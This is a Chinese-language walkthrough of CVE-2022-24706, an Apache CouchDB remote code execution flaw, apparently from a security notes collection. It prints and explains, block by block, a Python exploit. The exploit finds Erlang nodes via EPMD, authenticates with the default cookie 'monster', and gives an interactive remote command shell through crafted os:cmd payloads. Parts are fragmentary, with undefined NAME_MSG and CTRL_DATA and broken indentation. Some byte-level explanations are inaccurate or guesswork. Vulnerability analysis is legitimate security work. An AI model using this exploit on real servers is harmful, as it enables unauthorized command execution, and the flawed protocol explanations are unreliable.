# 代码执行\_CouchDB_CVE-2022-24706

- [知识星球](https://wx.zsxq.com/dweb2/index/search/CVE-2022-24706)
- [CVE-2022-24706 Apache couchdb 默认 erlang-cookie 的 RCE 漏洞分析](https://zgao.top/cve-2022-24706-apache-couchdb-%E9%BB%98%E8%AE%A4erlang-cookie%E7%9A%84rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)
- [exploit-db](https://www.exploit-db.com/exploits/50914)
- [cxsecurity](https://cxsecurity.com/issue/WLB-2022110003)
- [CNNVD](https://www.cnnvd.org.cn/home/globalSearch?keyword=CVE-2022-24706)

```python
python poc2.py 192.168.1.215 4369
```

当阅读并理解这段代码时，我们可以逐行分析它的各个部分：

```python
import socket
from hashlib import md5
import struct
import sys
import re
import time

TARGET = sys.argv[1]
EPMD_PORT = int(sys.argv[2]) # Default Erlang distributed port
COOKIE = "monster" # Default Erlang cookie for CouchDB
ERLNAG_PORT = 0
EPM_NAME_CMD = b"\x00\x01\x6e" # Request for nodes list
```

这部分是引入所需的库和模块，以及设置一些常量和变量。例如，TARGET 是目标主机的 IP 地址或域名，EPMD_PORT 是 Erlang 分布式端口(默认为 4369) ，COOKIE 是用于身份验证的 Erlang Cookie，EPM_NAME_CMD 是请求获取节点列表的命令。


```python
# Connect to EPMD:

try:
epm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
epm_socket.connect((TARGET, EPMD_PORT))
except socket.error as msg:
print("Couldnt connect to EPMD: %s\n terminating program" % msg)
sys.exit(1)

epm_socket.send(EPM_NAME_CMD) # request Erlang nodes
if epm_socket.recv(4) == b"\x00\x00\x11\x11": # OK
data = epm_socket.recv(1024)
data = data[0 : len(data) - 1].decode("ascii")
data = data.split("\n")
if len(data) == 1:
choise = 1
print("Found " + data[0])
else:
print("\nMore than one node found, choose which one to use:")
line_number = 0
for line in data:
line_number += 1
print(" %d) %s" % (line_number, line))
choise = int(input("\n> "))

    ERLNAG_PORT = int(re.search("\d+$", data[choise - 1])[0])

else:
print("Node list request error, exiting")
sys.exit(1)
epm_socket.close()
```

这部分代码尝试连接到 EPMD(Erlang Port Mapper Daemon) ，然后发送获取节点列表的命令。如果连接成功，它会接收和解析服务器的响应以获得节点列表。然后，它会要求用户选择一个节点以连接。最后，它会关闭与 EPMD 的连接。


```python
# Connect to Erlang port:

try:
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET, ERLNAG_PORT))
except socket.error as msg:
print("Couldnt connect to Erlang server: %s\n terminating program" % msg)
sys.exit(1)

s.send(NAME_MSG)
s.recv(5)
challenge = s.recv(1024) # Receive "challenge" message
print(challenge)
challenge = struct.unpack(">I", challenge[9:13])[0]
```

这部分代码与所选的 Erlang 节点建立连接，并发送名称消息以获取服务器返回的挑战数据。

```python
CHALLENGE_REPLY = b"\x00\x15r\x01\x02\x03\x04"

# ...

CHALLENGE_REPLY += md5(bytes(COOKIE, "ascii") + bytes(str(challenge), "ascii")).digest()
s.send(CHALLENGE_REPLY)
CHALLENGE_RESPONSE = s.recv(1024)
```

这部分代码构造响应消息，将鉴权 Cookie 和挑战的哈希值发送回服务器。服务器将根据该信息验证客户端身份。

```python
data_size = 0
while True:
if data_size <= 0:
CMD = input("> ")
if not CMD:
continue
elif CMD == "exit":
sys.exit(0)
s.send(compile_cmd(CMD))
data_size = struct.unpack(">I", s.recv(4))[0] # Get data size
s.recv(45) # Control message
data_size -= 45 # Data size without control message
time.sleep(0.1)
elif data_size < 1024:
data = s.recv(data_size)
time.sleep(0.1)
print(data[3:].decode())
data_size = 0
else:
data = s.recv(1024)
time.sleep(0.1)
print(data[4:].decode())
data_size -= 1024
```

最后，这部分代码包含一个循环，允许用户输入命令以远程执行。如果命令为空或为 "exit"，程序将退出。否则，它将使用 compile_cmd 函数编码命令，并发送给目标主机。接收到的数据将根据其大小分批处理和打印。

总之，这段代码利用 Erlang Distribution Protocol 漏洞，通过与一个运行 Erlang 节点的目标主机进行通信，实现远程执行命令的能力。它包括与 EPMD 和 Erlang 节点的连接、发送和接收数据以及命令执行等步骤。


---

```python
EPM_NAME_CMD = b"\x00\x01\x6e"  # Request for nodes list 
```

在 Erlang 语言中，节点之间的通信是通过 Erlang Distribution Protocol 进行的。Erlang Port Mapper Daemon(EPMD) 是一个管理 Erlang 节点之间通信的进程，它会维护节点列表，并能够为连接到它的节点提供其他节点的信息。

在 Erlang Distribution Protocol 中，用于获取节点列表的请求命令的格式是一个字节序列，而 EPM_NAME_CMD 就是这个请求命令。这个命令的构成是：

b"\x00\x01"：这是一个 2 字节的命令标识，表示请求获取节点列表。
b"\x6e"：这是一个字节，表示要获取的节点列表的类型。
通过将这个请求命令发送给 EPMD，可以请求它返回当前连接到 EPMD 的节点列表。在这个代码中，EPM_NAME_CMD 是用于请求获取节点列表的命令，程序会将这个命令发送给 EPMD，然后解析 EPMD 返回的节点列表，以便用户选择要与之通信的节点。

---

```python
def compile_cmd(CMD):
    MSG = b"\x83h\x02gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03\x00\x00\x00"
    MSG += b"\x00\x00h\x05w\x04callw\x02osw\x03cmdl\x00\x00\x00\x01k"
    MSG += struct.pack(">H", len(CMD))
    MSG += bytes(CMD, "ascii")
    MSG += b"jw\x04user"
    PAYLOAD = b"\x70" + CTRL_DATA + MSG
    PAYLOAD = struct.pack("!I", len(PAYLOAD)) + PAYLOAD
    return PAYLOAD
```

这个函数 compile_cmd(CMD) 的作用是构建用于远程执行命令的 Payload(有效负载) 。


```python
def compile_cmd(CMD):
    MSG = b"\x83h\x02gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03\x00\x00\x00"
    MSG += b"\x00\x00h\x05w\x04callw\x02osw\x03cmdl\x00\x00\x00\x01k"
```

这一部分定义了一个字节序列 MSG，看起来像是一些二进制指令。这些指令构成了一个 Erlang 的消息，用于与远程 Erlang 节点通信。

```python
    MSG += struct.pack(">H", len(CMD))
```

这一行将要执行的命令的长度转换成一个二进制数据，并将它添加到 MSG 中。这是为了告诉远程 Erlang 节点要执行的命令的长度。

```python
    MSG += bytes(CMD, "ascii")
```
这一行将要执行的命令(CMD 参数) 转换成一个字节序列，并将它添加到 MSG 中。这是要执行的真正的命令内容。

```python
    MSG += b"jw\x04user"
```

这一行添加了一些后续的字节，看起来是消息的结束标志。

```python
    PAYLOAD = b"\x70" + CTRL_DATA + MSG
    PAYLOAD = struct.pack("!I", len(PAYLOAD)) + PAYLOAD
```

这一部分将之前构建的 MSG 添加到了另一个字节序列 PAYLOAD 中，前面添加了一个标识字节 \x70 和之前定义的 CTRL_DATA。然后，PAYLOAD 的长度被转换成一个二进制数据，添加到 PAYLOAD 的前面，用来告诉远程节点整个负载的长度。

```python
    return PAYLOAD
```

最后，函数返回构建好的负载，这个负载包含了要执行的命令和其他一些信息，可以通过网络发送给远程 Erlang 节点，用于触发远程命令的执行。

---

在代码中的 AAAAAA@AAAAAAA 实际上是一个占位符，这个占位符的作用是预留位置来填充其他数据。这种占位符在许多编程场景中都会使用，用于在代码中暂时放置数据的位置，稍后再用真实的数据来替换它们。在这个特定的代码中，AAAAAA@AAAAAAA 很可能是一个预留的标记，用于将来可能添加的一些具体数据或标识信息。

---



